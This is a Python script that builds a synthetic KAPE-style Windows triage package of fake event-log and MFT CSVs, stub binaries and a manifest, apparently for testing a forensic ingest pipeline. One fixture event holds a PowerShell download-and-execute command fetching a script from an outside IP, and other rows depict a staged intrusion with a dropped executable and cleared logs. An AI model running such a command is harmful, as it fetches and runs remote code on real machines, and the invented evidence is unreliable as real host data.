#!/usr/bin/env python3
"""Generate samples/kape-minimal(.zip) — a tiny synthetic Windows triage package.

Why this exists: `samples/` is gitignored (real evidence never lands in the
repo), so a fresh clone has nothing to feed the backend-backed e2e run
(`PLAYWRIGHT_BACKEND_E2E=1`) or `./scripts/validate-ingest.sh --sample
kape-minimal`. This builds a deterministic package that exercises the ingest
path end to end without shipping any real host data:

  EventLogs/WKS-042_EvtxECmd_Output.csv   -> timeline events (artifact "evtx")
  FileSystem/WKS-042_MFTECmd_$MFT_Output.csv -> MFT-tagged timeline events
  C/...                                    -> filesystem nodes (Disk view)

Entities (User/Host/Process/File/IpAddress) fall out of the CSV columns via
worker.parsers.entities.ENTITY_FIELDS.

Deterministic by construction: fixed timestamps, fixed ordering, fixed zip
member metadata, so re-running produces a byte-identical archive.

Usage:
    python3 scripts/make-sample-kape-minimal.py [--out samples] [--force]
"""

from __future__ import annotations

import argparse
import csv
import io
import shutil
import zipfile
from pathlib import Path

HOST = "WKS-042"
USER = "analyst"

# EvtxECmd-shaped rows. Column names are the ones the worker parser reads:
# TimeCreated (timestamp), EventId/Description/UserName/Channel (summary),
# Computer/ProcessName/IpAddress (entity extraction).
EVTX_COLUMNS = [
    "RecordNumber",
    "EventId",
    "TimeCreated",
    "Channel",
    "Provider",
    "Computer",
    "UserName",
    "ProcessName",
    "IpAddress",
    "Description",
    "PayloadData1",
]

EVTX_ROWS = [
    (1, 4624, "2026-02-11 08:14:03.1234567", "Security", "Microsoft-Windows-Security-Auditing",
     f"{HOST}", f"{HOST}\\{USER}", r"C:\Windows\System32\svchost.exe", "10.10.4.21",
     "An account was successfully logged on", "LogonType: 3"),
    (2, 4688, "2026-02-11 08:16:44.0000000", "Security", "Microsoft-Windows-Security-Auditing",
     f"{HOST}", f"{HOST}\\{USER}", r"C:\Users\analyst\AppData\Local\Temp\update-agent.exe",
     "", "A new process has been created", "ParentImage: C:\\Windows\\explorer.exe"),
    (3, 4104, "2026-02-11 08:17:02.5000000", "Microsoft-Windows-PowerShell/Operational",
     "Microsoft-Windows-PowerShell", f"{HOST}", f"{HOST}\\{USER}",
     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "185.53.178.9",
     "Creating Scriptblock text (1 of 1)",
     "IEX (New-Object Net.WebClient).DownloadString('http://185.53.178.9/a.ps1')"),
    (4, 7045, "2026-02-11 08:19:31.7770000", "System", "Service Control Manager",
     f"{HOST}", "SYSTEM", r"C:\Windows\Temp\svc-helper.exe", "",
     "A service was installed in the system", "ServiceName: SvcHelper"),
    (5, 1102, "2026-02-11 09:02:10.0100000", "Security", "Microsoft-Windows-Eventlog",
     f"{HOST}", f"{HOST}\\{USER}", r"C:\Windows\System32\wevtutil.exe", "",
     "The audit log was cleared", "SubjectUserName: analyst"),
    (6, 4625, "2026-02-11 09:11:57.3300000", "Security", "Microsoft-Windows-Security-Auditing",
     f"{HOST}", f"{HOST}\\svc_backup", r"C:\Windows\System32\lsass.exe", "10.10.4.99",
     "An account failed to log on", "Status: 0xC000006D"),
]

# MFTECmd $MFT-shaped rows. Created0x10/LastModified0x10 are in the parser's
# TIMESTAMP_COLUMNS; "MFTECmd" in the file name tags these events as MFT.
MFT_COLUMNS = [
    "EntryNumber",
    "SequenceNumber",
    "InUse",
    "ParentPath",
    "FileName",
    "Extension",
    "IsDirectory",
    "FileSize",
    "Created0x10",
    "LastModified0x10",
    "LastAccess0x10",
]

MFT_ROWS = [
    (41235, 2, "True", r".\Users\analyst\AppData\Local\Temp", "update-agent.exe", ".exe",
     "False", 184320, "2026-02-11 08:15:58.1200000", "2026-02-11 08:15:58.1200000",
     "2026-02-11 08:16:44.0000000"),
    (41236, 1, "True", r".\Windows\Temp", "svc-helper.exe", ".exe",
     "False", 96256, "2026-02-11 08:19:20.4400000", "2026-02-11 08:19:20.4400000",
     "2026-02-11 08:19:31.7770000"),
    (41240, 1, "False", r".\Users\analyst\Downloads", "invoice-2026.pdf.lnk", ".lnk",
     "False", 1422, "2026-02-11 08:12:04.0000000", "2026-02-11 08:12:04.0000000",
     "2026-02-11 08:12:40.0000000"),
    (41255, 3, "True", r".\Users\analyst\AppData\Roaming", "settings.dat", ".dat",
     "False", 8192, "2026-01-04 22:41:19.0000000", "2026-02-11 09:14:02.0000000",
     "2026-02-11 09:14:02.0000000"),
    (5, 5, "True", r".", "$MFT", "", "False", 268435456,
     "2025-11-02 03:11:00.0000000", "2026-02-11 09:20:00.0000000",
     "2026-02-11 09:20:00.0000000"),
]

# Raw collection tree: (relative path under C/, file bytes).
RAW_FILES: list[tuple[str, bytes]] = [
    ("Users/analyst/AppData/Local/Temp/update-agent.exe",
     b"MZ\x90\x00\x03" + b"\x00" * 59 + b"SYNTHETIC-SAMPLE-NOT-A-REAL-BINARY\n"),
    ("Users/analyst/Downloads/invoice-2026.pdf.lnk",
     b"L\x00\x00\x00\x01\x14\x02\x00 synthetic shortcut\n"),
    ("Users/analyst/AppData/Roaming/settings.dat",
     b"synthetic settings blob\n"),
    ("Windows/Temp/svc-helper.exe",
     b"MZ\x90\x00\x03" + b"\x00" * 59 + b"SYNTHETIC-SERVICE-BINARY\n"),
    ("Windows/System32/winevt/Logs/README.txt",
     b"Synthetic KAPE-shaped sample. No real .evtx is bundled; the pre-parsed\n"
     b"EvtxECmd CSV under EventLogs/ carries the events.\n"),
]

MANIFEST = """{
  "hostname": "WKS-042",
  "platform": "windows",
  "collector": "kape",
  "collector_version": "1.3.0.2",
  "source_type": "triage",
  "os_version": "Windows 10 22H2",
  "architecture": "x64",
  "timezone": "UTC",
  "collected_at": "2026-02-11T09:30:00Z",
  "note": "Synthetic fixture generated by scripts/make-sample-kape-minimal.py"
}
"""


def _csv_text(columns: list[str], rows: list[tuple]) -> str:
    buf = io.StringIO(newline="")
    writer = csv.writer(buf, lineterminator="\r\n")
    writer.writerow(columns)
    for row in rows:
        writer.writerow(row)
    return buf.getvalue()


def build_tree() -> list[tuple[str, bytes]]:
    """Return the package member list as (relative posix path, bytes)."""
    members: list[tuple[str, bytes]] = [
        ("manifest.json", MANIFEST.encode()),
        (f"EventLogs/{HOST}_EvtxECmd_Output.csv",
         _csv_text(EVTX_COLUMNS, EVTX_ROWS).encode()),
        (f"FileSystem/{HOST}_MFTECmd_$MFT_Output.csv",
         _csv_text(MFT_COLUMNS, MFT_ROWS).encode()),
    ]
    members += [(f"C/{rel}", data) for rel, data in RAW_FILES]
    return sorted(members)


def write_dir(out_dir: Path, members: list[tuple[str, bytes]], force: bool) -> None:
    if out_dir.exists():
        if not force:
            raise SystemExit(f"{out_dir} exists; pass --force to regenerate")
        shutil.rmtree(out_dir)
    for rel, data in members:
        target = out_dir / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)


def write_zip(zip_path: Path, members: list[tuple[str, bytes]]) -> None:
    if zip_path.exists():
        zip_path.unlink()
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for rel, data in members:
            info = zipfile.ZipInfo(f"kape-minimal/{rel}", date_time=(2026, 2, 11, 9, 30, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            info.external_attr = 0o644 << 16
            zf.writestr(info, data)


def main() -> None:
    repo_root = Path(__file__).resolve().parents[1]
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", default=str(repo_root / "samples"),
                        help="Output directory (default: <repo>/samples)")
    parser.add_argument("--force", action="store_true",
                        help="Overwrite an existing samples/kape-minimal tree")
    parser.add_argument("--chown", default=None, metavar="UID:GID",
                        help="chown the generated files (use when running as root "
                             "inside a container so the host user owns the output)")
    args = parser.parse_args()

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    members = build_tree()

    write_dir(out / "kape-minimal", members, args.force)
    write_zip(out / "kape-minimal.zip", members)

    if args.chown:
        uid_s, _, gid_s = args.chown.partition(":")
        uid, gid = int(uid_s), int(gid_s or uid_s)
        import os

        os.chown(out / "kape-minimal.zip", uid, gid)
        for path in sorted((out / "kape-minimal").rglob("*")) + [out / "kape-minimal"]:
            os.chown(path, uid, gid)

    total = sum(len(data) for _, data in members)
    print(f"Wrote {out / 'kape-minimal'} ({len(members)} files, {total} bytes)")
    print(f"Wrote {out / 'kape-minimal.zip'}")
    print("Validate with: ./scripts/validate-ingest.sh --sample kape-minimal")


if __name__ == "__main__":
    main()
